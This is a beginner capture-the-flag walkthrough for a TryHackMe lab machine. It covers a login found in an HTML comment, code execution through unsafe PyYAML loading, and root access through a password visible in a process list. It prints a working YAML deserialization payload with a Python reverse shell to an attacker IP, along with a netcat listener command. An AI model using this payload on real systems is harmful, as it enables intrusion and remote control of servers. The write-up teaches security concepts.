#  Byte Lotus (Beach Bar)

This guide walks through every step of compromising the **Byte Lotus** machine on TryHackMe. We will go from having zero access to becoming
the `root` superuser, explaining **what** we are doing, **why** it works, and **how** each vulnerability happens behind the scenes.

---

## 🗺️ High-Level Attack Roadmap

```
[ Step 1: Recon ]  ──>  Find hidden credentials in HTML comment
         │
         ▼
[ Step 2: RCE ]    ──>  Exploit unsafe YAML parsing in Python
         │
         ▼
[ Step 3: Shell ]  ──>  Gain initial access as "bartender" & grab User Flag
         │
         ▼
[ Step 4: PrivEsc ]──>  Find root password in "ps aux" process list
         │
         ▼
[ Step 5: Root ]   ──>  Switch to root user & grab Root Flag

```

---

## Phase 1: Initial Reconnaissance & Login

### 1. Port Scanning

We start every pentest by scanning the target IP with `nmap` to find open services:

```bash
nmap -sC -sV <TARGET_IP>

```

**Output Highlights:**

* **Port 22 (SSH):** Open (OpenSSH)
* **Port 80 (HTTP):** Open (Gunicorn / Python Web Server)

---

### 2. Inspecting the Web Application

Navigating to `http://<TARGET_IP>/` redirects us to a login page titled **"DJ booth sign-in"**.

To see what the web developer left behind, we open the **Page Source** in our browser (`Ctrl + U` or Right-Click ➔ *View Page Source*).

#### 🔍 The Finding

Hidden inside an HTML comment, we spot developer notes:

```html
<!--    
  staff note: the demo DJ login is still enabled for the soft opening.    
  dj / dj  -- swap this before the season starts (ticket BAR-7)  
-->

```

#### 💡 Beginner Concept: Information Disclosure via HTML Comments

> Web developers frequently use HTML comments (`<!-- comment -->`) to leave notes for themselves or teammates. However, browsers download
 the full HTML file before rendering it, meaning **anyone visiting the page can read these notes**. Never leave sensitive information like
 usernames or passwords in client-side code!

#### Action:

Go back to the login form and enter:

* **Username:** `dj`
* **Password:** `dj`

We are now logged into the Beach Bar Dashboard!

---
<img width="1884" height="811" alt="beachbarDJ" src="https://github.com/user-attachments/assets/4f0e7970-7bf5-44df-9520-e1ba6acceb3f" />

## Phase 2: Remote Code Execution (RCE) via Unsafe YAML

Once inside the dashboard, we find a feature called **Playlists**:

> *"Export the current playlist as YAML, tweak it, and load it back via Import."*



#### 💡 Beginner Concept: Insecure YAML Deserialization

> **YAML** is a standard text format used to store data structures like lists and key-value pairs.
> In Python, `yaml.load(..., Loader=yaml.Loader)` uses PyYAML's **Unsafe Loader**. This loader does not just parse text—it has a feature
allowing it to reconstruct live Python objects! By using special tags like `!!python/object/apply`, an attacker can tell Python to
 **execute system commands** on the server while it reads the file.

---

### 2. Creating the Reverse Shell Payload

To turn this vulnerability into an interactive terminal session on our local machine (Kali), we construct a malicious YAML file.

1. **Start a Netcat Listener on your Attack Box (Kali):**
```bash
nc -lvnp 4444

```


*(This opens port 4444 on your computer, waiting for the target server to connect back to you.)*
2. **Craft the Payload ):**
*(Replace `YOUR_IP` with your own TryHackMe VPN IP address)*
```yaml
!!python/object/apply:os.system
- "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

```



---

### 3. Executing the Payload

1.Go to the Import Playlist page on the web app.
2.Paste the YAML payload directly into the playlist text input box.
3.Click the Load button.
4.PyYAML deserializes the input, executes os.system(), and triggers our Python reverse shell command!

Check your Netcat terminal in Kali—you now have a command prompt on the target machine:

```text
connect to [YOUR_IP] from (UNKNOWN) 
$ whoami
bartender

```

We are logged in as the low-privileged user **`bartender`**.

---

### 4. Capturing User Flag (`user.txt`)

Now that we have shell access, we can view the user flag:

```bash
cat /home/bartender/user.txt


```

🚩 **User Flag:** `THM{y4ml_pl4yl1st_***********_b34ch}`

---

## Phase 3: Privilege Escalation to Root

Now that we are on the system as `bartender`, we need to find a way to escalate our privileges to `root` (the system administrator).
While enumerating the filesystem, we navigate to /opt/beach-bar/jukeboxd/ and inspect jukeboxd.py:
```
cd /opt/beach-bar/jukeboxd
cat jukeboxd.py
```


```CODE:
def main():
    parser = argparse.ArgumentParser(description="Beach Bar jukebox streamer")
    parser.add_argument("--stream-pass", required=True, help="stream backend password")

```
What This File Tells Us:
       1.The script requires a mandatory argument: --stream-pass.
       2.This means whoever started this daemon on the server had to type the password in the command line when launching it!

### 1. Process Enumeration with `ps aux`

On Linux systems, we run `ps aux` to list all running processes across the machine,
Armed with the knowledge that --stream-pass must be in the execution command, we check the running system processes to see
how jukeboxd.py was launched:

```bash
ps aux | grep jukeboxd.py

```

#### 💡 Beginner Concept: What is `ps aux`?

> * `ps` = Process Status
> * `a` = Show processes for **all users**
> * `u` = Display in a **user-friendly format** (showing usernames and PIDs)
> * `x` = Include processes that run in the background (daemons/services)
> 
> 
> Running `ps aux` prints the exact command line used to launch every program on the server!

---

### 2. Uncovering the Leaked Password

Linux output for our command:

```text
root 610 0.0 0.2 20176 11700 ? Ss 08:24 0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k

```

#### 🔍 What This Output Reveals:

1. **`root`**: The background process is running under the **root superuser account**.
2. **`--stream-pass SunsetSpritz2024!`**: The administrator passed the secret password as a command-line flag!


---

### 3. Switching to Root (Credential Reuse)

System administrators often reuse the same password for background services and administrative accounts.

We test if the stream password (`SunsetSpritz2024!`) works for the `root` user account:

```bash
su root

```

When prompted for the password, enter:
`SunsetSpritz2024!`

Prompt changes to:

```text
root@tryhackme-2404:/opt/beach-bar/jukeboxd#

```

We are now full `root`!

---

### 4. Capturing Root Flag (`root.txt`)

Navigate to the root user's home directory and read the final flag:

```bash
cd /root
cat root.txt

```

🚩 **Root Flag:** `THM{cr3d3nt14l_*********b34ch_b4r}`

---

